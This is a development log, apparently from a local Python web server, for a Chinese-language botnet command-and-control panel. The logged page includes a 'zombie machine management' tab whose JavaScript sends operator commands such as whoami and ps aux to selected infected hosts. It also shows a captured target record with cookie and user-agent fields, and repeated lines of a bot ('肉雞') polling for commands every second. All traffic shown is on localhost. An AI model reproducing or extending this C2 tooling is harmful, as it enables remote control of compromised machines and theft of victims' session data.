2025-06-25 00:29:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0006s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T16:29:36.801Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 00:29:36.804923</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 00:29:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:50] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 00:29:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 00:29:59 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 00:29:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0012s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T16:29:36.801Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 00:29:36.804923</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 00:29:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:59] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 00:29:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:59] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
2025-06-25 00:29:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:59] "GET /static/css/control_message.css HTTP/1.1" 200 -
2025-06-25 00:29:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:59] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 00:30:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:30:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:30:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:30:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:30:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:30:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:30:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:30:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:30:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:30:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:30:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:30:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:30:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0022s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:30:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:30:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:30:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:30:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:30:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:30:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:30:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:30:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:30:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:30:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:30:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:30:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:30:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:30:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:30:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:30:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:30:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:30:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:30:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:30:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:30:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:30:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:30:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:30:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:30:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:30:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:30:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:30:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:30:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:30:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
